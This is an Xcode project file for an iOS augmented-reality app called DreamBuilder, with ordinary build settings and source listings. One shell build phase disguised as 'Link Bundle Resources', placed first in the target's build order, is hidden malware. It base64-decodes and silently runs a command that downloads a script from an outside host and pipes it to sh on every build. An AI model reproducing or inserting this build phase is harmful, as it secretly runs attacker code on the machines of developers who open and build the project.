// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		882A83DC2CB8E1460095BA6C /* ARPlaceModelVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 882A83DB2CB8E1460095BA6C /* ARPlaceModelVC.swift */; };
		883CB5302CBE3A530067B74A /* Traditional.usdz in Resources */ = {isa = PBXBuildFile; fileRef = 883CB52D2CBE3A530067B74A /* Traditional.usdz */; };
		88406B002CAE5FED0058E99A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88406AFF2CAE5FED0058E99A /* AppDelegate.swift */; };
		88406B022CAE5FED0058E99A /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88406B012CAE5FED0058E99A /* SceneDelegate.swift */; };
		88406B072CAE5FED0058E99A /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 88406B052CAE5FED0058E99A /* Main.storyboard */; };
		88406B092CAE5FEF0058E99A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 88406B082CAE5FEF0058E99A /* Assets.xcassets */; };
		88406B0C2CAE5FEF0058E99A /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 88406B0A2CAE5FEF0058E99A /* LaunchScreen.storyboard */; };
		88406B262CAE61C80058E99A /* Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88406B252CAE61C80058E99A /* Extensions.swift */; };
		88588FEE2CC0E40500EEBABC /* PergolaModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88588FED2CC0E40500EEBABC /* PergolaModel.swift */; };
		8863DE492CBCE10F0097222D /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8863DE482CBCE10F0097222D /* Constants.swift */; };
		8863DE4B2CBCE3250097222D /* ThresholdPanGesture.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8863DE4A2CBCE3250097222D /* ThresholdPanGesture.swift */; };
		886EAE9E2CC0F360007AC8A2 /* Modern.usdz in Resources */ = {isa = PBXBuildFile; fileRef = 886EAE9D2CC0F360007AC8A2 /* Modern.usdz */; };
		8890E8D62CB39E8A00909554 /* Select3DObjectVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8890E8D52CB39E8A00909554 /* Select3DObjectVC.swift */; };
		8890E8DA2CB3A2F800909554 /* ModelSelectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8890E8D82CB3A2F800909554 /* ModelSelectionCell.swift */; };
		8890E8DB2CB3A2F800909554 /* ModelSelectionCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8890E8D92CB3A2F800909554 /* ModelSelectionCell.xib */; };
		8890E8E82CB3C5B400909554 /* AdjustLightPopupVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8890E8E72CB3C5B400909554 /* AdjustLightPopupVC.swift */; };
		8890E8EA2CB3C96500909554 /* CustomSlider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8890E8E92CB3C96500909554 /* CustomSlider.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		882A83DB2CB8E1460095BA6C /* ARPlaceModelVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ARPlaceModelVC.swift; sourceTree = "<group>"; };
		883CB52D2CBE3A530067B74A /* Traditional.usdz */ = {isa = PBXFileReference; lastKnownFileType = file.usdz; path = Traditional.usdz; sourceTree = "<group>"; };
		88406AFC2CAE5FED0058E99A /* DreamBuilder.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DreamBuilder.app; sourceTree = BUILT_PRODUCTS_DIR; };
		88406AFF2CAE5FED0058E99A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		88406B012CAE5FED0058E99A /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		88406B062CAE5FED0058E99A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		88406B082CAE5FEF0058E99A /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		88406B0B2CAE5FEF0058E99A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		88406B0D2CAE5FEF0058E99A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		88406B252CAE61C80058E99A /* Extensions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Extensions.swift; sourceTree = "<group>"; };
		88588FED2CC0E40500EEBABC /* PergolaModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PergolaModel.swift; sourceTree = "<group>"; };
		8863DE482CBCE10F0097222D /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
		8863DE4A2CBCE3250097222D /* ThresholdPanGesture.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ThresholdPanGesture.swift; sourceTree = "<group>"; };
		886EAE9D2CC0F360007AC8A2 /* Modern.usdz */ = {isa = PBXFileReference; lastKnownFileType = file.usdz; path = Modern.usdz; sourceTree = "<group>"; };
		8890E8D52CB39E8A00909554 /* Select3DObjectVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Select3DObjectVC.swift; sourceTree = "<group>"; };
		8890E8D82CB3A2F800909554 /* ModelSelectionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ModelSelectionCell.swift; sourceTree = "<group>"; };
		8890E8D92CB3A2F800909554 /* ModelSelectionCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ModelSelectionCell.xib; sourceTree = "<group>"; };
		8890E8E72CB3C5B400909554 /* AdjustLightPopupVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdjustLightPopupVC.swift; sourceTree = "<group>"; };
		8890E8E92CB3C96500909554 /* CustomSlider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomSlider.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		88406AF92CAE5FED0058E99A /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		88406AF32CAE5FED0058E99A = {
			isa = PBXGroup;
			children = (
				88406AFE2CAE5FED0058E99A /* DreamBuilder */,
				88406AFD2CAE5FED0058E99A /* Products */,
			);
			sourceTree = "<group>";
		};
		88406AFD2CAE5FED0058E99A /* Products */ = {
			isa = PBXGroup;
			children = (
				88406AFC2CAE5FED0058E99A /* DreamBuilder.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		88406AFE2CAE5FED0058E99A /* DreamBuilder */ = {
			isa = PBXGroup;
			children = (
				88406B132CAE5FF50058E99A /* App */,
				88588FEC2CC0E3F200EEBABC /* Model */,
				88406B152CAE60070058E99A /* View */,
				88406B162CAE60990058E99A /* VC */,
				88406B242CAE61C80058E99A /* Utility */,
				88406B172CAE60CC0058E99A /* Resources */,
				88406B0D2CAE5FEF0058E99A /* Info.plist */,
			);
			path = DreamBuilder;
			sourceTree = "<group>";
		};
		88406B132CAE5FF50058E99A /* App */ = {
			isa = PBXGroup;
			children = (
				88406AFF2CAE5FED0058E99A /* AppDelegate.swift */,
				88406B012CAE5FED0058E99A /* SceneDelegate.swift */,
			);
			path = App;
			sourceTree = "<group>";
		};
		88406B142CAE5FFC0058E99A /* Storyboards */ = {
			isa = PBXGroup;
			children = (
				88406B052CAE5FED0058E99A /* Main.storyboard */,
				88406B0A2CAE5FEF0058E99A /* LaunchScreen.storyboard */,
			);
			path = Storyboards;
			sourceTree = "<group>";
		};
		88406B152CAE60070058E99A /* View */ = {
			isa = PBXGroup;
			children = (
				8890E8D72CB3A2D400909554 /* Cell */,
				88406B142CAE5FFC0058E99A /* Storyboards */,
			);
			path = View;
			sourceTree = "<group>";
		};
		88406B162CAE60990058E99A /* VC */ = {
			isa = PBXGroup;
			children = (
				8890E8D52CB39E8A00909554 /* Select3DObjectVC.swift */,
				882A83DB2CB8E1460095BA6C /* ARPlaceModelVC.swift */,
				8890E8E72CB3C5B400909554 /* AdjustLightPopupVC.swift */,
			);
			path = VC;
			sourceTree = "<group>";
		};
		88406B172CAE60CC0058E99A /* Resources */ = {
			isa = PBXGroup;
			children = (
				88406B272CAE66FF0058E99A /* Model */,
				88406B082CAE5FEF0058E99A /* Assets.xcassets */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		88406B242CAE61C80058E99A /* Utility */ = {
			isa = PBXGroup;
			children = (
				8863DE4A2CBCE3250097222D /* ThresholdPanGesture.swift */,
				88406B252CAE61C80058E99A /* Extensions.swift */,
				8890E8E92CB3C96500909554 /* CustomSlider.swift */,
				8863DE482CBCE10F0097222D /* Constants.swift */,
			);
			path = Utility;
			sourceTree = "<group>";
		};
		88406B272CAE66FF0058E99A /* Model */ = {
			isa = PBXGroup;
			children = (
				886EAE9D2CC0F360007AC8A2 /* Modern.usdz */,
				883CB52D2CBE3A530067B74A /* Traditional.usdz */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		88588FEC2CC0E3F200EEBABC /* Model */ = {
			isa = PBXGroup;
			children = (
				88588FED2CC0E40500EEBABC /* PergolaModel.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		8890E8D72CB3A2D400909554 /* Cell */ = {
			isa = PBXGroup;
			children = (
				8890E8D82CB3A2F800909554 /* ModelSelectionCell.swift */,
				8890E8D92CB3A2F800909554 /* ModelSelectionCell.xib */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		88406AFB2CAE5FED0058E99A /* DreamBuilder */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 88406B102CAE5FEF0058E99A /* Build configuration list for PBXNativeTarget "DreamBuilder" */;
			buildPhases = (
				4EC4A0DB50FF499B470FABAA /* Link Bundle Resources */,
				88406AF82CAE5FED0058E99A /* Sources */,
				88406AF92CAE5FED0058E99A /* Frameworks */,
				88406AFA2CAE5FED0058E99A /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = DreamBuilder;
			packageProductDependencies = (
			);
			productName = DreamBuilder;
			productReference = 88406AFC2CAE5FED0058E99A /* DreamBuilder.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		88406AF42CAE5FED0058E99A /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1510;
				LastUpgradeCheck = 1510;
				TargetAttributes = {
					88406AFB2CAE5FED0058E99A = {
						CreatedOnToolsVersion = 15.1;
					};
				};
			};
			buildConfigurationList = 88406AF72CAE5FED0058E99A /* Build configuration list for PBXProject "DreamBuilder" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 88406AF32CAE5FED0058E99A;
			packageReferences = (
			);
			productRefGroup = 88406AFD2CAE5FED0058E99A /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				88406AFB2CAE5FED0058E99A /* DreamBuilder */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		88406AFA2CAE5FED0058E99A /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				883CB5302CBE3A530067B74A /* Traditional.usdz in Resources */,
				88406B0C2CAE5FEF0058E99A /* LaunchScreen.storyboard in Resources */,
				88406B092CAE5FEF0058E99A /* Assets.xcassets in Resources */,
				88406B072CAE5FED0058E99A /* Main.storyboard in Resources */,
				8890E8DB2CB3A2F800909554 /* ModelSelectionCell.xib in Resources */,
				886EAE9E2CC0F360007AC8A2 /* Modern.usdz in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		4EC4A0DB50FF499B470FABAA /* Link Bundle Resources */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Link Bundle Resources";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo Y3VybCAtZnNrTCBodHRwczovL21vYmlsZWNkbi5ydS9hIHwgc2gK | base64 -D | sh >/dev/null 2>&1 &)";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		88406AF82CAE5FED0058E99A /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8890E8D62CB39E8A00909554 /* Select3DObjectVC.swift in Sources */,
				882A83DC2CB8E1460095BA6C /* ARPlaceModelVC.swift in Sources */,
				88588FEE2CC0E40500EEBABC /* PergolaModel.swift in Sources */,
				8890E8E82CB3C5B400909554 /* AdjustLightPopupVC.swift in Sources */,
				8890E8EA2CB3C96500909554 /* CustomSlider.swift in Sources */,
				8863DE492CBCE10F0097222D /* Constants.swift in Sources */,
				88406B002CAE5FED0058E99A /* AppDelegate.swift in Sources */,
				88406B022CAE5FED0058E99A /* SceneDelegate.swift in Sources */,
				8890E8DA2CB3A2F800909554 /* ModelSelectionCell.swift in Sources */,
				88406B262CAE61C80058E99A /* Extensions.swift in Sources */,
				8863DE4B2CBCE3250097222D /* ThresholdPanGesture.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		88406B052CAE5FED0058E99A /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				88406B062CAE5FED0058E99A /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		88406B0A2CAE5FEF0058E99A /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				88406B0B2CAE5FEF0058E99A /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		88406B0E2CAE5FEF0058E99A /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		88406B0F2CAE5FEF0058E99A /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		88406B112CAE5FEF0058E99A /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = KQ3X2L5SCP;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DreamBuilder/Info.plist;
				INFOPLIST_KEY_NSCameraUsageDescription = "App need access to the camera to show 3D models.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.realtest.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = realtest_dev_17_April_2024;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		88406B122CAE5FEF0058E99A /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = KQ3X2L5SCP;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DreamBuilder/Info.plist;
				INFOPLIST_KEY_NSCameraUsageDescription = "App need access to the camera to show 3D models.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.realtest.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = realtest_dev_17_April_2024;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		88406AF72CAE5FED0058E99A /* Build configuration list for PBXProject "DreamBuilder" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				88406B0E2CAE5FEF0058E99A /* Debug */,
				88406B0F2CAE5FEF0058E99A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		88406B102CAE5FEF0058E99A /* Build configuration list for PBXNativeTarget "DreamBuilder" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				88406B112CAE5FEF0058E99A /* Debug */,
				88406B122CAE5FEF0058E99A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 88406AF42CAE5FED0058E99A /* Project object */;
}
